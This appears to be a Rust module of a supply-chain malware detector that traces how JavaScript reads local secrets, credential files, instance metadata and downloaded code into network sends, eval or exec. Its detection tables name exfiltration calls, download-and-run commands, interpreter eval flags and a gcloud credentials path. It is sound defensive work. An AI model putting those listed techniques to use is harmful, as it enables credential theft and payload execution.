//! The supply-chain model of the JavaScript pass (phase 3 step 3 of the
//! Rust-first refactor, docs/RUST_ENGINE.md §8): local data — what a script
//! reads from the machine — followed on the parsed tree through bindings,
//! the script's own functions, callbacks, closures and members of `this` to
//! a network send. It answers what `flow::local_data_sent_at` answers on raw
//! text — the first send, the kind of data, what was read, whether only an
//! address held it — with names resolved by scope instead of followed by
//! name within a window of text: a quote in a regular expression, a name
//! that means two things in a bundle, or thousands of assignments of padding
//! change nothing. A text the parser doesn't read, or a reading past its
//! work budget, is the text follower's to answer.
//!
//! Sources and sends are the text follower's, read from the same tables of
//! the rule pack: an environment variable by its name (`_SH_IDENTITY_VAR_RE`,
//! `_SH_SECRET_VAR_RE`, `_LD_ENV_QUIET_RE`) and the whole environment; the
//! os module's names (`_LD_MODULE_NAMES`); a file outside the package
//! (`_LD_READERS`, `flow::ld_outside`); what a command prints
//! (`shell::sh_output_data`); the instance's metadata and the public IP
//! address a lookup service gives. Sends are the calls `_LD_SEND_RE` and its
//! siblings name, with the arguments they count as addresses, resolved by
//! scope (`require('https').request`, `const r = module.require; r('http')`),
//! and what a connection or a client made by the script writes.
//!
//! The same reading answers received code (`received::received_code_kind`
//! on raw text): data the script receives over the network — a response, a
//! connection's or a server's data, what a download prints — reaching code
//! run (`eval`, `Function`, vm, `Module._compile`, exec, an interpreter
//! given `-e`), a module loaded by its name, or a deserializer.

use super::descs::{dedupe, D};
use super::driver::{fixpoint, Config, Out};
use crate::pystr;
use super::eval::{Eval, R};
use super::*;
use crate::flow::LiteralTest;
use crate::pack::Pack;
use std::sync::Arc;

// ---------------------------------------------------------------- the kinds --

pub const K_IDENTITY: u16 = 1 << 0;
pub const K_ENV: u16 = 1 << 1;
pub const K_WHOLE_ENV: u16 = 1 << 2;
pub const K_FILE: u16 = 1 << 3;
pub const K_REPORT: u16 = 1 << 4;
pub const K_CREDENTIALS: u16 = 1 << 5;
pub const K_ADDRESS: u16 = 1 << 6;
/// not local data: a path outside the package (a read of it is)
pub const K_PATH: u16 = 1 << 7;
/// a file of a credential store (`_CRED_STORE_RE`, not a public key's):
/// a file, kept apart so that a send of one is not hidden behind an
/// earlier read of another file
pub const K_CRED_FILE: u16 = 1 << 8;
/// not local data: data received over the network (a response, what a
/// socket or a server is sent, what a download prints); run as code, it is
/// received code
pub const K_RECEIVED: u16 = 1 << 9;
/// not local data: data the script decodes (base64, hex, a decompression,
/// a decryption; in Python also an XOR, characters' codes, a reversal); run
/// as code, it is code the script decodes
pub const K_DECODED: u16 = 1 << 10;
/// not local data: what a binary read of a file gives (its bytes; what:
/// the file)
pub const K_BYTES: u16 = 1 << 11;
/// not local data: bytes taken from inside a file (a slice of a binary
/// read that skips its start: `data[offset:]`, `buf.subarray(n)`; what:
/// the file); written to a file and run, a program hidden in that file
pub const K_CARVED: u16 = 1 << 12;
/// not local data: a file opened for writing (what: the keys of its path,
/// one per line: [`path_keys`])
pub const K_WFILE: u16 = 1 << 13;
/// not local data: what the script reads back from itself (its own file,
/// its docstring, its loader's source) or from a data file shipped with it,
/// and the paths of those files (Python's model, 0.1.9: N-19); run as code,
/// it is code the script reads back from its own file
pub const K_OWN: u16 = 1 << 14;

/// The kinds' names (the text follower's strings), by bit index.
pub const KIND_NAMES: [&str; 15] = [
    "identity", "environment", "environment", "file", "report", "credentials", "address", "path", "file", "received",
    "decoded", "bytes", "carved", "written", "own",
];

/// The kinds a send of local data never reports.
pub(crate) const NOT_LOCAL: u16 = K_PATH | K_RECEIVED | K_DECODED | K_BYTES | K_CARVED | K_WFILE | K_OWN;

/// What a file written then run held: code or a program the script decodes,
/// one it carves out of another file, one it downloads.
pub(crate) const DROPPED: u16 = K_DECODED | K_CARVED | K_RECEIVED;

/// A file the script writes: the keys of its path (`path_keys`), the kinds
/// of what it writes there ([`DROPPED`]'s), what those were (the carved
/// file's name), where.
#[derive(Clone, Debug)]
pub struct Written {
    pub keys: Vec<PyStr>,
    pub kinds: u16,
    pub what: PyStr,
    pub at: u32,
}

/// The files a script writes (its supply-chain model's table): a write is
/// recorded once.
pub(crate) fn record_written(table: &std::cell::RefCell<Vec<Written>>, keys: Vec<PyStr>, sc: &Sc, at: u32) {
    let kinds = sc.kinds & DROPPED;
    if kinds == 0 || keys.is_empty() {
        return;
    }
    let carved = bit_index(K_CARVED);
    let what = sc.firsts.iter().find(|(k, _, _)| *k == carved).map(|(_, w, _)| (**w).clone()).unwrap_or_default();
    let mut t = table.borrow_mut();
    if t.iter().any(|w| w.at == at && w.keys == keys) {
        return;
    }
    t.push(Written { keys, kinds, what, at });
}

/// The interpreter a written file is run with, as a script: cmd runs
/// whatever it is given, so only a batch file (`.bat`, `.cmd`) is its
/// script; anything else it runs is a program (`cmd /c setup.exe`).
pub(crate) fn script_interp(w: &Written, interp: Option<PyStr>) -> Option<PyStr> {
    interp.filter(|i| {
        !eq(i, "cmd")
            || w.keys.iter().any(|k| {
                k.first() == Some(&0x3D) && {
                    let k = pystr::lower(k);
                    pystr::ends_with(&k, ".bat") || pystr::ends_with(&k, ".cmd")
                }
            })
    })
}

/// The written file a path's keys name, if any: what it held (the first
/// write, by offset).
pub(crate) fn written_at(table: &std::cell::RefCell<Vec<Written>>, keys: &[PyStr]) -> Option<Written> {
    table.borrow().iter().filter(|w| w.keys.iter().any(|k| keys.contains(k))).min_by_key(|w| w.at).cloned()
}

/// A file the script writes, then runs (the tree's answer): the run's
/// line, what the file held ([`DROPPED`]'s kinds), the file it was carved
/// out of, the interpreter that runs it.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct DropRun {
    pub line: usize,
    pub kinds: u16,
    pub what: PyStr,
    pub interp: Option<PyStr>,
}

/// The first written file run among a model's findings.
pub(crate) fn first_drop(text: &[u32], findings: &[Out]) -> Option<DropRun> {
    findings
        .iter()
        .filter_map(|f| match f {
            Out::Dropped { at, kinds, what, interp, .. } => Some((*at, *kinds, what, interp)),
            _ => None,
        })
        .min_by_key(|d| d.0)
        .map(|(at, kinds, what, interp)| {
            let at = (at as usize).min(text.len());
            DropRun { line: text[..at].iter().filter(|&&c| c == 0x0A).count() + 1, kinds, what: what.clone(), interp: interp.clone() }
        })
}

/// A command line's parts: literal text, or an expression.
pub(crate) enum Part<T> {
    Text(PyStr),
    Expr(T),
}

/// Is a command line's word a flag (`-u`, `--x`, `/c`), not a script?
pub(crate) fn is_flag(w: &[u32]) -> bool {
    match w.first() {
        Some(&0x2D) => true,
        Some(&0x2F) => w.len() <= 3 && !w[1..].contains(&0x2F),
        _ => false,
    }
}

/// The expressions a command line made of parts runs: one at a command's
/// start is its program (`p + ' -q'`, `` `"${p}"` ``, after `&&`); one
/// after an interpreter and its flags is the script it runs (`'sh ' + p`).
pub(crate) fn run_parts<T: Copy>(parts: &[Part<T>]) -> Vec<(T, Option<PyStr>)> {
    let mut out = Vec::new();
    let mut start = true;
    let mut interp: Option<PyStr> = None;
    for part in parts {
        match part {
            Part::Expr(e) => {
                if start {
                    out.push((*e, None));
                } else if let Some(i) = interp.take() {
                    out.push((*e, Some(i)));
                }
                start = false;
                interp = None;
            }
            Part::Text(t) => {
                for (k, seg) in t.split(|&c| c == 0x3B || c == 0x26 || c == 0x7C || c == 0x0A).enumerate() {
                    if k > 0 {
                        start = true;
                        interp = None;
                    }
                    let words: Vec<&[u32]> = pystr::split_ws(seg)
                        .into_iter()
                        .map(|w| pystr::strip_chars(w, "\"'`"))
                        .filter(|w| !w.is_empty())
                        .collect();
                    if words.is_empty() {
                        continue; // (blanks, quotes: where it was)
                    }
                    // (what follows the text is a word of its own)
                    let apart = seg.last().is_some_and(|&c| crate::unicode::is_space(c) || c == 0x22 || c == 0x27);
                    if start {
                        start = false;
                        interp = interp_name(words[0]).filter(|_| apart && words[1..].iter().all(|w| is_flag(w)));
                    } else if interp.is_some() && !(apart && words.iter().all(|w| is_flag(w))) {
                        interp = None;
                    }
                }
            }
        }
    }
    out
}

/// A path's key as its text: blanks dropped, every quote a double one
/// (`dest + 'output'` and `dest + "output"` are one key).
pub(crate) fn text_key(text: &[u32]) -> PyStr {
    text.iter()
        .filter(|&&c| !crate::unicode::is_space(c))
        .map(|&c| if c == 0x27 || c == 0x60 { 0x22 } else { c })
        .collect()
}

/// A path's key as a string it holds (`=` and the string, `./` dropped).
pub(crate) fn value_key(s: &[u32]) -> PyStr {
    let mut t: &[u32] = s;
    while t.len() > 2 && t[0] == 0x2E && t[1] == 0x2F {
        t = &t[2..];
    }
    let mut k = vec![0x3Du32];
    k.extend_from_slice(t);
    k
}

/// The interpreter a program's name is, as reasons name it (`Python`,
/// `node`, `bash` …), if it is one.
pub(crate) fn interp_name(program: &[u32]) -> Option<PyStr> {
    let base = match program.iter().rposition(|&c| c == 0x2F || c == 0x5C) {
        Some(k) => &program[k + 1..],
        None => program,
    };
    let base = if base.len() > 4 && eq(&base[base.len() - 4..], ".exe") { &base[..base.len() - 4] } else { base };
    if base.len() >= 6 && eq(&base[..6], "python") {
        return Some(u("Python"));
    }
    if is_one(base, &["node", "nodejs"]) {
        return Some(u("node"));
    }
    if is_one(base, INTERPRETERS) || is_one(base, &["cscript", "wscript"]) {
        return Some(base.to_vec());
    }
    None
}

/// Where a value's decoded data was decoded (the decoding's offset), if it
/// holds some.
pub(crate) fn decoded_at(sc: &Sc) -> Option<u32> {
    if sc.kinds & K_DECODED == 0 {
        return None;
    }
    let bit = bit_index(K_DECODED);
    sc.firsts.iter().filter(|(k, _, _)| *k == bit).map(|(_, _, a)| *a).min()
}

/// The kinds that count even when only an address holds them (the text
/// follower's `_LD_NOT_IN_ADDRESS` are the others, the whole environment
/// excepted).
pub(crate) const STRONG_IN_ADDRESS: u16 = K_IDENTITY | K_WHOLE_ENV | K_FILE | K_CRED_FILE | K_REPORT;

/// What no client sends (import_time_risk's harvest): the instance's
/// credentials, the whole environment, a credential store. A send that
/// carries one is reported by it, whatever was read before it.
pub(crate) const HARVEST: u16 = K_CREDENTIALS | K_WHOLE_ENV | K_CRED_FILE;

/// Is a finding of this kind and what a harvest (signs.rs grades it so)?
pub(crate) fn harvest_of(p: &Pack, kind: &str, what: &[u32], whole: &[u32]) -> bool {
    match kind {
        "credentials" => true,
        "environment" => what == whole,
        "file" => cred_store(p, what),
        _ => false,
    }
}

/// Does a file read's `what` name a credential store?
pub(crate) fn cred_store(p: &Pack, what: &[u32]) -> bool {
    p.re("_CRED_STORE_RE").search(what).is_some() && p.re("_PUBLIC_KEY_FILE_RE").search(what).is_none()
}

/// A path's text as a source keeps it: its first 60 characters; but when only the whole text names a credential store,
/// "…" and the 59 that end with that name, so that what is shown, and graded from it, still names the store (GR-7:
/// `path.join(os.homedir(), '.config', 'gcloud', 'application_default_credentials.json')`).
pub(crate) fn shown_what(p: &Pack, text: &[u32]) -> PyStr {
    let head = pystr::upto(text, 60);
    if head.len() == text.len() || cred_store(p, head) || !cred_store(p, text) {
        return head.to_vec();
    }
    let end = p.re("_CRED_STORE_RE").search(text).map(|m| m.end()).unwrap_or(text.len());
    let mut out = vec![0x2026];
    out.extend_from_slice(&text[end.saturating_sub(59)..end]);
    out
}

/// The kind's bit for a kind name (the text follower's, and shell.rs's).
pub(crate) fn kind_bit(kind: &str, what: &[u32], whole: &[u32]) -> u16 {
    match kind {
        "identity" | "lookup-identity" => K_IDENTITY,
        "environment" if what == whole => K_WHOLE_ENV,
        "environment" => K_ENV,
        "file" => K_FILE,
        "report" => K_REPORT,
        "credentials" => K_CREDENTIALS,
        "address" => K_ADDRESS,
        _ => K_IDENTITY,
    }
}

pub(crate) fn bit_index(bit: u16) -> u8 {
    bit.trailing_zeros() as u8
}

/// A value without one kind of source (its parameters kept): nothing when
/// that was all it held.
pub(crate) fn sc_without(v: &V, bit: u16) -> V {
    let sc = match v.sc.as_ref() {
        Some(sc) if sc.kinds & bit != 0 => sc,
        _ => return v.clone(),
    };
    let kinds = sc.kinds & !bit;
    if kinds == 0 {
        if v.params.is_empty() {
            return V::empty();
        }
        return V::new(false, None, None, None, v.params.clone(), v.clean, v.built, v.kind);
    }
    let idx = bit_index(bit);
    let firsts = sc.firsts.iter().filter(|f| f.0 != idx).cloned().collect();
    V { sc: Some(Rc::new(Sc { kinds, firsts })), ..v.clone() }
}

// V.kind marks (bits 1 and 2 are project mode's request and response objects)

/// a connection, or a request being written: its write, end, send … send
pub const OBJ_CONN: u8 = 4;
/// an HTTP client the script made (axios.create(), got.extend()): its
/// calls and its post, put, patch, request send
pub const OBJ_CLIENT: u8 = 8;
/// process.env itself: a member of it is one variable
pub const OBJ_ENV: u8 = 16;
/// a server the script made (`http.createServer()`): what it is sent is
/// received — its request handler's arguments, its events' (`on('request'
/// | 'connection', …)`) — but the server holds nothing it was sent: its
/// address, its options and what a framework keeps beside it are not
/// received data (vite's dev server)
pub const OBJ_SERVER: u8 = 32;
/// the marks a closure's variable keeps
pub const MARKS: u8 = OBJ_CONN | OBJ_CLIENT | OBJ_ENV | OBJ_SERVER;

/// The categories a parameter's reach is recorded under: what is sent, and
/// what only an address holds.
pub const SEND_DATA: u8 = 0;
pub const SEND_ADDR: u8 = 1;
/// (a parameter that is the command line an exec call runs: the script's
/// own wrapper of exec)
pub const EXEC_CMD: u8 = 2;
/// (a parameter that is the path a read reads: the script's own reader)
pub const READ_PATH: u8 = 3;
/// (a parameter that names the environment variable read: `getEnv(name)`)
pub const ENV_NAME: u8 = 4;
/// The categories of received code (the text detector's): a parameter
/// that is code run, the name of a module loaded, data deserialized.
pub const RUN_CODE: u8 = 5;
pub const LOAD_NAME: u8 = 6;
pub const DESERIALIZE: u8 = 7;

/// A container's methods that put what they are given into it (a splice, its items from the third argument on).
const COLLECTS: &[&str] = &["push", "unshift", "splice", "set", "add", "append", "fill"];
/// The calls that put what they are given (after the first argument) into their first argument.
const PUTS_INTO_FIRST: &[&str] =
    &["Object.assign", "Object.defineProperty", "Object.defineProperties", "Reflect.set", "Reflect.defineProperty"];
/// The calls that decode what they are given (the text rule's
/// `_DECODE_CALL_RE`, read by name).
const DECODERS: &[&str] = &[
    "atob", "window.atob", "globalThis.atob", "self.atob", "global.atob", "zlib.inflateSync", "zlib.inflateRawSync",
    "zlib.gunzipSync", "zlib.unzipSync", "zlib.brotliDecompressSync",
];

/// A received-code category's name (`_DL_CATEGORY_REASON`'s keys).
pub fn received_cat(cat: u8) -> Option<&'static str> {
    match cat {
        RUN_CODE => Some("run"),
        LOAD_NAME => Some("import"),
        DESERIALIZE => Some("deserialize"),
        _ => None,
    }
}

// ---------------------------------------------------------------- the model --

/// The supply-chain model of one text: the pack, the text (its spans are
/// what the text follower's tests read) and what is known before reading.
pub struct Supply {
    pub pack: Arc<Pack>,
    pub text: Vec<u32>,
    pub lit: LiteralTest,
    /// the names that hold a path outside the package (core's `outside`)
    pub outside: std::cell::RefCell<HashSet<PyStr>>,
    pub whole: PyStr,
    /// a function given as an argument -> the call it is given to (built
    /// when first asked)
    pub arg_of: std::cell::RefCell<Option<std::collections::HashMap<NodeId, NodeId>>>,
    /// the files the script writes code or a program to (a run of one is
    /// a dropper's)
    pub written: std::cell::RefCell<Vec<Written>>,
}

use std::collections::HashSet;

impl Supply {
    pub fn new(pack: Arc<Pack>, text: &[u32]) -> Supply {
        let lit = LiteralTest::new(&pack, text);
        let whole = pack.text("_LD_WHOLE_ENV");
        Supply {
            pack,
            text: text.to_vec(),
            lit,
            outside: std::cell::RefCell::new(HashSet::new()),
            whole,
            arg_of: std::cell::RefCell::new(None),
            written: std::cell::RefCell::new(Vec::new()),
        }
    }

    fn p(&self) -> &Pack {
        &self.pack
    }

    fn span(&self, lo: u32, hi: u32) -> &[u32] {
        let lo = (lo as usize).min(self.text.len());
        let hi = (hi as usize).min(self.text.len()).max(lo);
        &self.text[lo..hi]
    }
}

/// The send a call is: the arguments it counts as addresses (-1 all of
/// them, 0 none, n the first n), and whether only a name composed with a
/// literal counts (a DNS lookup).
#[derive(Clone, Copy, Debug)]
struct Spec {
    addresses: i8,
    composed: bool,
}

const SEND1: Spec = Spec { addresses: 1, composed: false };
const OPTIONS: Spec = Spec { addresses: 0, composed: false };
const REQUEST2: Spec = Spec { addresses: 2, composed: false };
const ADDRESS: Spec = Spec { addresses: -1, composed: false };
const LOOKUP: Spec = Spec { addresses: -1, composed: true };

/// The HTTP clients a name no declaration binds is taken for.
pub const CLIENT_GLOBALS: &[&str] = &["axios", "got", "needle", "superagent", "ky", "undici"];

/// Names the platform defines besides GLOBAL_OBJECTS: no address of the
/// script's own (sc_constant_text).
const PLATFORM_NAMES: &[&str] = &[
    "undefined", "NaN", "Infinity", "self", "global", "location", "top", "parent", "frames", "module", "exports",
    "require", "define", "__dirname", "__filename",
];

const FETCH_MODULES: &[&str] = &[
    "node-fetch", "cross-fetch", "isomorphic-fetch", "isomorphic-unfetch", "make-fetch-happen", "minipass-fetch",
    "node-fetch-native", "ofetch",
];
const POSTERS: &[&str] = &["axios", "got", "needle", "superagent", "ky"];
/// The `request` client and its forks: `request(options, callback)` and
/// `request.get(url, callback)`, the callback given the response's body.
const REQUEST_CLIENTS: &[&str] = &["request", "@cypress/request", "postman-request"];
const CONN_WRITES: &[&str] = &["write", "end", "send", "sendall", "sendto", "request"];
const CONN_CHAIN: &[&str] =
    &["on", "once", "addListener", "prependListener", "setHeader", "setTimeout", "setNoDelay", "setKeepAlive", "setEncoding"];
const EXEC_NAMES: &[&str] =
    &["execSync", "execFileSync", "spawnSync", "exec", "execFile", "execa", "execaSync", "execaCommand", "execaCommandSync"];
const FETCHERS: &[&str] = &["fetch", "axios.get", "http.get", "https.get", "got", "got.get"];
/// The calls that write data to a file by its path (fs, fs-extra).
const WRITE_FILES: &[&str] = &["writeFileSync", "writeFile", "appendFileSync", "appendFile", "outputFileSync", "outputFile"];

/// Is a name WebAssembly's (`WebAssembly.compile`, `WebAssembly.Module`)?
fn is_web_assembly(name: &[u32]) -> bool {
    name.len() > 12 && eq(&name[..12], "WebAssembly.")
}

fn last_part(name: &[u32]) -> &[u32] {
    match name.iter().rposition(|&c| c == 0x2E) {
        Some(k) => &name[k + 1..],
        None => name,
    }
}

fn is_one(name: &[u32], set: &[&str]) -> bool {
    set.iter().any(|s| eq(name, s))
}

fn dotted2<'a>(a: &'a str, b: &'a [&'a str]) -> impl Fn(&[u32]) -> bool + 'a {
    move |name: &[u32]| b.iter().any(|m| eq(name, &format!("{}.{}", a, m)))
}

/// Is a literal's text a URL that its host continues past (`'https://'`,
/// `'http://x-'`): what is joined to it next is resolved as a host name?
pub(crate) fn host_prefix(text: &[u32]) -> bool {
    let low: Vec<u32> = text.iter().map(|&c| if (0x41..=0x5A).contains(&c) { c + 32 } else { c }).collect();
    let rest = ["https://", "http://", "wss://", "ws://"].iter().find_map(|s| {
        let s: Vec<u32> = s.chars().map(|c| c as u32).collect();
        if low.len() >= s.len() && low[..s.len()] == s[..] {
            Some(&low[s.len()..])
        } else {
            None
        }
    });
    match rest {
        // (the host goes on into what is joined: nothing yet, a label not
        // ended, or one ended by '.' or '-'; `'http://x.com' + path` is a path)
        Some(r) => {
            r.len() <= 200
                && !r.iter().any(|&c| {
                    matches!(c, 0x2F | 0x3F | 0x23 | 0x22 | 0x27 | 0x60 | 0x3A) || char::from_u32(c).is_some_and(|ch| ch.is_whitespace())
                })
                && (r.is_empty() || matches!(r[r.len() - 1], 0x2E | 0x2D) || !r.contains(&0x2E))
        }
        None => false,
    }
}

/// Calls whose value is a number or a flag, not the data they are given.
const NUMERIC: &[&str] = &[
    "Buffer.byteLength", "byteLength", "parseInt", "parseFloat", "Number", "Boolean", "Math.floor", "Math.round",
    "Math.ceil", "Math.abs", "Math.trunc", "Math.min", "Math.max", "Date.now", "isNaN", "isFinite",
];

/// The send a callee's names make, if any.
fn send_spec(names: &[PyStr]) -> Option<Spec> {
    for n in names {
        let n = n.as_slice();
        if eq(n, "fetch") || is_one(n, FETCH_MODULES) || eq(n, "undici.fetch") || eq(n, "undici.request") {
            return Some(SEND1);
        }
        if eq(n, "navigator.sendBeacon") || eq(n, "sendBeacon") || eq(n, "Request") {
            return Some(SEND1);
        }
        for m in POSTERS {
            if dotted2(m, &["post", "put", "patch"])(n) {
                return Some(SEND1);
            }
        }
        if eq(n, "axios") || eq(n, "axios.request") {
            return Some(OPTIONS);
        }
        if is_one(n, &["http.get", "http.request", "https.get", "https.request", "axios.get", "got", "got.get"]) {
            return Some(ADDRESS);
        }
        // (request: the options hold the address and what is sent: form,
        // formData, body, json; a GET's data is only its address)
        for m in REQUEST_CLIENTS {
            if eq(n, m) || dotted2(m, &["post", "put", "patch"])(n) {
                return Some(OPTIONS);
            }
            if dotted2(m, &["get", "head", "del", "delete"])(n) {
                return Some(ADDRESS);
            }
        }
        if eq(n, "dns.lookup") || eq(n, "dns.promises.lookup") {
            return Some(LOOKUP);
        }
        let starts = |p: &str| n.len() >= p.len() && eq(&n[..p.len()], p);
        if starts("dns.resolve") || starts("dns.promises.resolve") {
            return Some(LOOKUP);
        }
    }
    None
}

/// Does a call of these names make a connection (its writes send)?
fn makes_connection(names: &[PyStr]) -> bool {
    names.iter().any(|n| {
        is_one(
            n,
            &[
                "http.request", "https.request", "http.get", "https.get", "http2.connect", "net.connect",
                "net.createConnection", "tls.connect", "dgram.createSocket",
            ],
        )
    })
}

/// Does a call of these names make a server (OBJ_SERVER)?
fn makes_server(names: &[PyStr]) -> bool {
    names.iter().any(|n| {
        is_one(
            n,
            &[
                "http.createServer", "https.createServer", "http2.createServer", "http2.createSecureServer",
                "net.createServer", "tls.createServer",
            ],
        )
    })
}

/// A server's methods that register a listener of its events: the events
/// that carry what it is sent (SERVER_DATA_EVENTS) give the listener
/// received data; its other events (`error`, `listening`, `close`) don't.
const SERVER_EVENTS: &[&str] = &["on", "once", "addListener", "prependListener", "prependOnceListener"];
const SERVER_DATA_EVENTS: &[&str] = &[
    "request", "connection", "secureConnection", "upgrade", "connect", "checkContinue", "checkExpectation",
    "stream", "session", "message", "data",
];

/// Does a call of these names make a client (its calls send)?
fn makes_client(names: &[PyStr]) -> bool {
    names.iter().any(|n| {
        is_one(n, &["axios.create", "got.extend", "got.create", "ky.create", "ky.extend"])
            || REQUEST_CLIENTS.iter().any(|m| dotted2(m, &["defaults"])(n))
    })
}

/// A client's calls that make a request (its value, and its callbacks,
/// are what the request receives).
const CLIENT_CALLS: &[&str] = &["get", "post", "put", "patch", "delete", "head", "options", "request", "stream", "fetch"];

/// Does a call of these names receive data over the network: a request (its
/// response, and the callbacks given it), a connection, a server (what it is
/// sent)?
fn receives(names: &[PyStr]) -> bool {
    names.iter().any(|n| {
        let n = n.as_slice();
        if eq(n, "fetch") || is_one(n, FETCH_MODULES) {
            return true;
        }
        if is_one(
            n,
            &[
                "http.get", "http.request", "https.get", "https.request", "http2.connect", "net.connect",
                "net.createConnection", "tls.connect", "dgram.createSocket", "http.createServer", "https.createServer",
                "http2.createServer", "http2.createSecureServer", "net.createServer", "tls.createServer",
                "undici.fetch", "undici.request", "undici.stream", "request-promise", "request-promise-native",
                "simple-get",
            ],
        ) {
            return true;
        }
        POSTERS.iter().chain(REQUEST_CLIENTS).any(|m| eq(n, m) || CLIENT_CALLS.iter().chain(&["del"]).any(|c| eq(n, &format!("{}.{}", m, c))))
    })
}

/// Does a command line download: curl or wget first (`_DL_SOURCE`'s exec
/// form)? What it prints is received, unless it asks the instance's
/// metadata or a public-IP service (local data: credentials, the address).
pub(crate) fn downloads(p: &Pack, command: &[u32]) -> bool {
    let t = pystr::lstrip(command);
    ["curl", "wget"].iter().any(|w| {
        t.len() >= w.len()
            && eq(&t[..w.len()], w)
            && t.get(w.len()).map_or(true, |&c| !(c == 0x5F || c == 0x2D || char::from_u32(c).is_some_and(|ch| ch.is_alphanumeric())))
    }) && p.re("_LD_METADATA_RE").search(command).is_none()
        && p.re("_LD_PUBLIC_IP_RE").search(command).is_none()
}

/// The interpreters a command line is given code to run with (`_DL_INTERP`).
pub(crate) const INTERPRETERS: &[&str] = &[
    "node", "nodejs", "bun", "deno", "sh", "bash", "zsh", "dash", "ksh", "python", "python3", "python2", "pythonw",
    "perl", "ruby", "php", "pwsh", "powershell", "osascript", "cmd",
];
/// The flags that make an interpreter run its next argument as code.
pub(crate) const EVAL_FLAGS: &[&str] = &[
    "-e", "-E", "-c", "-p", "-r", "--eval", "--print", "-Command", "-command", "-EncodedCommand", "-enc", "/c", "/C",
    "/k", "/K",
];
/// The global constructors whose `.constructor` is Function.
const CONSTRUCTORS: &[&str] =
    &["Function", "Object", "Array", "String", "Number", "Boolean", "Promise", "Date", "RegExp", "Error", "Symbol"];

/// What a received-code sink takes as its code: its category, the first
/// argument that is code, and whether every argument after it is too.
#[derive(Clone, Copy, Debug)]
struct Runs {
    cat: u8,
    from: usize,
    rest: bool,
}

/// The sink a callee's names are, if any (the text detector's runners,
/// import sinks and deserializers, `_DL_RUNNER`, `_DL_IMPORT_SINK`,
/// `_DL_DESERIAL`, by binding).
fn runs_of(names: &[PyStr]) -> Option<Runs> {
    for n in names {
        let n = n.as_slice();
        if eq(n, "eval") {
            return Some(Runs { cat: RUN_CODE, from: 0, rest: false });
        }
        if eq(n, "Function") {
            return Some(Runs { cat: RUN_CODE, from: 0, rest: true });
        }
        // (a bare execSync or exec no declaration binds is child_process's: a
        // snippet that leaves out its require)
        if is_one(
            n,
            &[
                "vm.runInThisContext", "vm.runInNewContext", "vm.runInContext", "vm.compileFunction",
                "child_process.exec", "child_process.execSync", "shelljs.exec", "execSync", "exec",
            ],
        ) {
            return Some(Runs { cat: RUN_CODE, from: 0, rest: false });
        }
        if eq(n, "require") || eq(n, "module.require") {
            return Some(Runs { cat: LOAD_NAME, from: 0, rest: false });
        }
        if eq(last_part(n), "unserialize") || is_one(n, &["js-yaml.load", "yaml.load"]) {
            return Some(Runs { cat: DESERIALIZE, from: 0, rest: false });
        }
    }
    None
}

impl<'p> Eval<'p> {
    fn sup(&self) -> Rc<Supply> {
        self.p.cfg.supply.clone().expect("the supply-chain model")
    }

    /// A value read from the machine: `bit` with `what`, read at `at`.
    fn sc_source(&self, bit: u16, what: PyStr, at: u32, line: u32, mark: u8) -> V {
        let bit = if bit == K_FILE && cred_store(self.sup().p(), &what) { K_CRED_FILE } else { bit };
        let f = &self.p.fns[self.fid as usize];
        let fname = if f.is_module { None } else { f.name.clone().map(Rc::new) };
        let sc = Sc { kinds: bit, firsts: vec![(bit_index(bit), Rc::new(what), at)] };
        V::new(true, Some((self.m, line)), fname, None, V::empty().params, 0, false, mark).with_sc(Some(Rc::new(sc)))
    }

    /// One variable of the environment, by its name.
    fn sc_env_var(&self, name: &[u32], at: u32, line: u32) -> V {
        let sup = self.sup();
        let p = sup.p();
        if p.re("_SH_IDENTITY_VAR_RE").match_(name).is_some() {
            return self.sc_source(K_IDENTITY, name.to_vec(), at, line, 0);
        }
        if p.re("_SH_SECRET_VAR_RE").search(name).is_some() && p.re("_LD_ENV_QUIET_RE").match_(name).is_none() {
            return self.sc_source(K_ENV, name.to_vec(), at, line, 0);
        }
        if is_one(name, &["HOME", "USERPROFILE", "APPDATA", "LOCALAPPDATA", "INIT_CWD", "HOMEPATH"]) {
            return self.sc_source(K_PATH, name.to_vec(), at, line, 0);
        }
        V::empty()
    }

    /// A pattern's name given a value: one variable when the value is
    /// process.env itself and the path names it.
    pub(super) fn sc_pattern_value(&self, v: &V, path: &Path, ident: NodeId) -> Option<V> {
        if v.kind & OBJ_ENV == 0 || path.len() != 1 {
            return None;
        }
        let a = self.a();
        let (at, line) = (a.0.nodes[ident as usize].start, a.line(ident));
        Some(match &path[0] {
            Some(name) => self.sc_env_var(name, at, line),
            None => v.plain(),
        })
    }

    /// The names a callee resolves to: `os.hostname`, `https.request`,
    /// `axios.post` (a package's member), `fetch` (a global, also through
    /// globalThis, window, self or global).
    fn sc_names(&mut self, callee: NodeId, scope: ScopeId) -> Vec<PyStr> {
        let m = self.m;
        let mut out: Vec<PyStr> = Vec::new();
        let (member, obj) = {
            let a = self.a();
            if a.kind(callee) == Kind::MemberExpression {
                (true, a.at(callee, jt::A))
            } else {
                (false, NONE)
            }
        };
        let prop = if member { self.p.member_name(m, callee, scope) } else { None };
        if member {
            if let Some(prop) = &prop {
                // a global's own member: self.fetch, global.fetch
                let global_obj = {
                    let a = self.a();
                    a.kind(obj) == Kind::Identifier
                        && ["globalThis", "window", "self", "global"].iter().any(|g| eq(a.name(obj), g))
                };
                if global_obj && self.bind(obj, scope).is_none() {
                    out.push(prop.clone());
                }
                for d in self.p.descs_of_expr(m, obj, scope, 0) {
                    if let D::Pkg(pk) = d {
                        let mut n = pk.clone();
                        n.push(0x2E);
                        n.extend_from_slice(prop);
                        out.push(n);
                    }
                }
            }
        }
        for d in self.p.descs_of_expr(m, callee, scope, 0) {
            match d {
                D::Builtin(b) => {
                    let mut n = b.clone();
                    for g in ["globalThis.", "window."] {
                        if n.len() > g.len() && eq(&n[..g.len()], g) {
                            n = n[g.len()..].to_vec();
                        }
                    }
                    out.push(n);
                }
                D::Global(g) => out.push(g),
                D::Pkg(pk) => out.push(pk),
                _ => {}
            }
        }
        dedupe(out)
    }

    /// The string a node is when it is constant: a string literal, a
    /// template without holes.
    fn sc_const_str(&self, node: NodeId) -> Option<PyStr> {
        let a = self.a();
        if let Some(v) = a.str_value(node) {
            return Some(v.to_vec());
        }
        if a.kind(node) == Kind::TemplateLiteral && a.list(node, jt::B).is_empty() {
            let q = a.list(node, jt::A);
            return Some(q.first().map(|&e| a.s(e, jt::A).to_vec()).unwrap_or_default());
        }
        None
    }

    /// The strings an expression may be, when they are constants: a literal,
    /// a name given one, an item of a constant list it is taken from (`for
    /// (const c of ['id', 'whoami'])`, `cmds.forEach((c) => …)`, `cmds[i]`).
